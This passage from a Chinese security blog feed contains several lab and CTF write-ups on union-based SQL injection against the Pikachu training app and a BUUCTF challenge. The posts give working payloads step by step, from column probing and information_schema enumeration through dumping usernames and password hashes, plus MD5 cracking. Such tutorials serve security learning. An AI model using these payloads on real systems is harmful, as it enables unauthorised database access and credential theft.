/></center><p>&emsp;&emsp;我们可以在界面中查看到url的内容，并且对输入内容均有反馈，在该类型的输入框中，我们可以直接在输入框中进行注入操作。（依旧可以使用bp进行抓包，但是我依旧是个懒狗）</p><p>&emsp;&emsp;</p><h4 id="2-分析回显行数"><a href="#2-分析回显行数" class="headerlink" title="2.分析回显行数"></a>2.分析回显行数</h4><p>&emsp;&emsp;（由于这次是搜索类型的注入，语句会在原有的基础上加入%进行闭合尝试）</p><p>&emsp;&emsp;判断是否有3行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">%</span><span class="hljs-string">&#x27; order by 3 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/4.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;判断是否有4行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">%</span><span class="hljs-string">&#x27; order by 4 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/5.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;从反馈中可以看见，回显行数是3行</p><p>&emsp;</p><h4 id="3-尝试or的注入"><a href="#3-尝试or的注入" class="headerlink" title="3.尝试or的注入"></a>3.尝试or的注入</h4><p>&emsp;&emsp;老规矩，用or的语句注入看看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">liaoyue<span class="hljs-operator">%</span><span class="hljs-string">&#x27; or 1=1 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/6.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;（为什么要加liaoyue呢，只是想试试是不是加不加都能全部显示出来，真是逆天，还真是）</p><p>&emsp;</p><h4 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4.获取数据库名"></a>4.获取数据库名</h4><p>&emsp;&emsp;开搞开搞，依旧是用union的语句进行联合查询注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">v<span class="hljs-operator">%</span><span class="hljs-string">&#x27; union select database(),user(),3#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/7.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;通过查询我们获取到了数据库名为pikaqiu，用户名为root</p><p>&emsp;</p><h4 id="5-获取表名"><a href="#5-获取表名" class="headerlink" title="5.获取表名"></a>5.获取表名</h4><p>&emsp;&emsp;利用查出来的数据库名称 <strong>pikachu</strong> 构建payload查询表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">v<span class="hljs-operator">%</span><span class="hljs-string">&#x27; union select 1,table_name,table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/8.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><p>&emsp;查询pikachu这个数据库发现里面有个users表，查看相关内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">gggggggg<span class="hljs-operator">%</span><span class="hljs-string">&#x27; union select 1,2,column_name from information_schema.columns where table_schema = &#x27;</span>pikachu<span class="hljs-string">&#x27; and TABLE_NAME = &#x27;</span>users<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/9.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;为什么用ggggggg，因为一大串看烦了</p><p>&emsp;</p><h4 id="7-获取表的内容"><a href="#7-获取表的内容" class="headerlink" title="7.获取表的内容"></a>7.获取表的内容</h4><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">gggggggg%&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,username,password <span class="hljs-keyword">from</span> users<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/10.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="8-进行解码"><a href="#8-进行解码" class="headerlink" title="8.进行解码"></a>8.进行解码</h4><p>&emsp;&emsp;（懒，看数字型文章去）</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>联合查询注入——字符型</title>
    <link href="/2022/08/09/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/"/>
    <url>/2022/08/09/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="联合查询注入——字符型注入"><a href="#联合查询注入——字符型注入" class="headerlink" title="联合查询注入——字符型注入"></a>联合查询注入——字符型注入</h1><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;初始界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;查询成功反馈:</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/1.png" style="zoom:67%;" /></center><p>&emsp;查询失败反馈：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/3.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见，这次是直接在框中进行输入内容，并且对输入内容均有反馈，在该类型的输入框中，我们可以直接在输入框中进行注入操作，当然， 你喜欢用bp也行，反正我是懒狗。</p><p>&emsp;&emsp;（当然，在真实的情况中，我们是不知道查询成功的反馈情况的，所以我们需要通过order语句判断回显行数）</p><p>&emsp;</p><h4 id="2-分析回显行数"><a href="#2-分析回显行数" class="headerlink" title="2.分析回显行数"></a>2.分析回显行数</h4><p>&emsp;&emsp;判断是否有1行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;order by 1#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/4.png" style="zoom:80%;" /></center><p>&emsp;&emsp;判断是否有2行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;order by 2#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/5.png" style="zoom:80%;" /></center><p>&emsp;&emsp;判断是否有3行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;order by 3#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/6.png" style="zoom:80%;" /></center><p>&emsp;&emsp;当判断第3行时，显示回显错误，说明后端数据库传递过来的数据一共回显两行。接下来尝试or的注入</p><p>&emsp;</p><h4 id="3-尝试or的注入"><a href="#3-尝试or的注入" class="headerlink" title="3.尝试or的注入"></a>3.尝试or的注入</h4><p>&emsp;&emsp;尝试让它将用户表所有人的信息查询出来，在后面加上永真的判断注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or 1=1 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/7.png" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4.获取数据库名"></a>4.获取数据库名</h4><p>&emsp;&emsp;接下来尝试用union的语句进行联合查询注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union select database(),user()#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/8.png" style="zoom:80%;" /></center><p>&emsp;&emsp;通过查询我们获取到了数据库名为pikaqiu，用户名为root</p><p>&emsp;</p><h4 id="5-获取表名"><a href="#5-获取表名" class="headerlink" title="5.获取表名"></a>5.获取表名</h4><p>&emsp;&emsp;利用查出来的数据库名称 <strong>pikachu</strong> 构建payload查询表名</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/9.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><p>&emsp;&emsp;查询pikachu这个数据库发现里面有个users表，查看相关内容:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union select table_name,column_name from information_schema.columns where table_schema = &#x27;</span>pikachu<span class="hljs-string">&#x27; and TABLE_NAME = &#x27;</span>users<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/10.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-获取表的内容"><a href="#7-获取表的内容" class="headerlink" title="7.获取表的内容"></a>7.获取表的内容</h4><p>&emsp;&emsp;知道了所属的所有表名，接下由于联合查询要求前后两个SQL语句的列名数要一致，所以这里只能用两个列名进行查询。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union select username,password from users#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/11.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="8-进行解码"><a href="#8-进行解码" class="headerlink" title="8.进行解码"></a>8.进行解码</h4><p>&emsp;&emsp;内容和数字型的结果一样需要解码，可以翻阅上一篇文章看就好，不过多阐述了。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>联合查询注入——数字型</title>
    <link href="/2022/08/08/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/"/>
    <url>/2022/08/08/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="联合查询注入——数字型注入"><a href="#联合查询注入——数字型注入" class="headerlink" title="联合查询注入——数字型注入"></a>联合查询注入——数字型注入</h1><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/1.jpg" style="zoom: 80%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/2.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见在界面中有下拉框，包含了1到6的数字，我们只能够选择数字，点击对应的数字回馈对应的用户信息，无法进行输入，所以我们需要将注意力放到报文当中</p><h4 id="2-分析报文"><a href="#2-分析报文" class="headerlink" title="2.分析报文"></a>2.分析报文</h4><p>&emsp;&emsp;点击数字1进行查询，得到如下报文：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/3.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;在报文中显示中可以看见传送了id=1的内容，可以判断出该处为注入点。</p><h4 id="3-进行注入"><a href="#3-进行注入" class="headerlink" title="3.进行注入"></a>3.进行注入</h4><p>&emsp;&emsp;分析查询结果：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;查询的结果可以看见，返回的是一个人名和一个邮箱，所以猜测查询语句查询了两个字段，在注入点中使用order语句测试字段数</p><p>&emsp;&emsp;先测试注入两个字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/5.jpg" style="zoom:80%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/6.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见，反馈是正常的，接下来尝试注入三个字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/7.jpg" style="zoom:80%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/8.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;通过2列和3列的注入反馈不同，说明没有第三列，查询语句指用了两个列名，假设治理使用的SQL语句为：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">select 人名 邮箱 <span class="hljs-keyword">from</span> 用户表 <span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="4-尝试or的注入"><a href="#4-尝试or的注入" class="headerlink" title="4.尝试or的注入"></a>4.尝试or的注入</h4><p>&emsp;&emsp;尝试让它将用户表所有人的信息查询出来，在后面加上永真的判断注入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/9.jpg" style="zoom:80%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/10.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见反馈出了所有人的名单信息，说明注册成功。</p><h4 id="5-获取数据库名"><a href="#5-获取数据库名" class="headerlink" title="5.获取数据库名"></a>5.获取数据库名</h4><p>&emsp;&emsp;使用 union 查询当前的数据名和当前的用户</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(),<span class="hljs-keyword">user</span>()<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/11.jpg" style="zoom:80%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/12.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见在反馈中给出了数据名和当前的用户信息。</p><h4 id="6-获取表名"><a href="#6-获取表名" class="headerlink" title="6.获取表名"></a>6.获取表名</h4><p>&emsp;&emsp;利用查出来的数据库名称 <strong>pikachu</strong> 构建payload查询表名:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> table_schema,table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pikachu&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/13.jpg" style="zoom:68%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/14.jpg" style="zoom:60%;" /></center><h4 id="7-获取表"><a href="#7-获取表" class="headerlink" title="7.获取表"></a>7.获取表</h4><p>&emsp;&emsp;查询pikachu这个数据库发现里面有个users表，查看相关内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> table_name,column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;pikachu&#x27;</span> <span class="hljs-keyword">and</span> TABLE_NAME <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;users&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/15.jpg" style="zoom:68%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/16.jpg" style="zoom:60%;" /></center><h4 id="8-获取表的内容"><a href="#8-获取表的内容" class="headerlink" title="8.获取表的内容"></a>8.获取表的内容</h4><p>&emsp;&emsp;通过第七步，就知道了所属的所有表名，接下由于联合查询要求前后两个SQL语句的列名数要一致，所以这里只能用两个列名进行查询。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/17.jpg" style="zoom:68%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/18.jpg" style="zoom:60%;" /></center><h4 id="9-进行解码"><a href="#9-进行解码" class="headerlink" title="9.进行解码"></a>9.进行解码</h4><p>&emsp;&emsp;通过上述的SQL注入，我们得到了三组用户名和密码</p><p>整理用户名和密码</p><ul><li><p>用户名 admin</p><ul><li>密码 e10adc3949ba59abbe56e057f20f883e</li></ul></li><li><p>用户名 pikachu</p><ul><li>密码 670b14728ad9902aecba32e22fa4f6bd</li></ul></li></ul><ul><li><p>用户名 test</p><ul><li>密码 e99a18c428cb38d5f260853678922e03</li></ul></li></ul><p>&emsp;&emsp;使用kali的工具hash-identitier判断用户的密码的哈希类型最终确定为MD5，进行解码：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/19.jpg" style="zoom:70%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/20.jpg" style="zoom:70%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/21.jpg" style="zoom:70%;" /></center><p>&emsp;&emsp;好家伙，不只是可以注入还是弱口令，框框给他几个大嘴巴子</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——联合查询注入</title>
    <link href="/2022/08/06/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/08/06/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——联合查询注入"><a href="#SQL注入——联合查询注入" class="headerlink" title="SQL注入——联合查询注入"></a>SQL注入——联合查询注入</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;联合查询注入是可回显的注入，在联合查询中，一般会将数据库查询的数据返回到页面中。联合查询注入利用的前提是初始的页面上有显示位，在一个网页的正常界面中，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>...<br><br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]；<br><br><span class="hljs-variable">$getid</span>=<span class="hljs-string">&quot;SELECT id FROM users WHERE uer_id = &#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$getid</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>().<span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>);<br><br><span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">mysql_numrows</span>(<span class="hljs-variable">$result</span>);<br>...<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;可以看见在$id变量中，该变量会将get传送过来的参数直接拼接到SQL语句中，如果我们输入的内容为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union+select+1+--+</span><br></code></pre></td></tr></table></figure><p>  &emsp;&emsp;拼接后SQL语句就变成了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;-1&#x27;</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-comment">-- &#x27;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp; 闭合前面的单引号，注释掉了后面的单引号，只需要在中间写上需要的Payload（有效负荷代码）就可以了。而加号则是服务器在处理用户输入的时候已自动将其转义为空字符了。</p><p>&emsp;（接下来的演示以BUUCTF中的SQL注入-1为例）：</p><h4 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h4><p>&emsp;&Emsp;我们在可能存在SQL注入变量的后边添加Payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1/and <span class="hljs-attribute">1</span>=2（整型判断）<br><br>单引号判断<span class="hljs-string">&#x27;显示数据库错误信息或者页面回显不同（整型、字符串类型判断）</span><br><span class="hljs-string"></span><br><span class="hljs-string">\（转义符）</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1/+1回显下一个或上一个页面（整型判断）</span><br><span class="hljs-string"></span><br><span class="hljs-string">注：加号&#x27;</span>+<span class="hljs-string">&#x27;在URL中有特殊含义，因此在需要对其进行URL编码为%2b</span><br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="2-判断是整型还是字符型"><a href="#2-判断是整型还是字符型" class="headerlink" title="2.判断是整型还是字符型"></a>2.判断是整型还是字符型</h4><p>&emsp;&emsp;输入and 1=1和and 1=2根据界面是否变化判断是否为整型注入。  判断是字符型还是数字型的表格：</p><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/3.png"></p><p>输入’ and 1=1 %23和 ‘ and 1=2%23后发现页面变化，判断为字符注入 </p><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/1.png"></p><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/2.png"></p><p>&emsp;&emsp;</p><h4 id="3-判断查询列数"><a href="#3-判断查询列数" class="headerlink" title="3.判断查询列数"></a>3.判断查询列数</h4><p> &emsp;&emsp;order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字 段名还可以指定字段的栏位进行排序，第一个查询字段为1，第二个为2，依次 类推。</p><p>&emsp;&emsp;输入3列时，页面正常: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;order by 3%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/4.png"></p><p>&emsp;&emsp;输入4列时,页面出错，说明只有3列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;order by 4%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/5.png"></p><p>&emsp;</p><h4 id="4-判断显示位"><a href="#4-判断显示位" class="headerlink" title="4.判断显示位"></a>4.判断显示位</h4><p>&emsp;&emsp;union的作用是将两个select查询结果合并，程序在展示数据的时候通常只会取结果集的第一行数据，看一下源码，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/6.png"></p><p>&emsp;</p><h4 id="5-获取所有数据库名"><a href="#5-获取所有数据库名" class="headerlink" 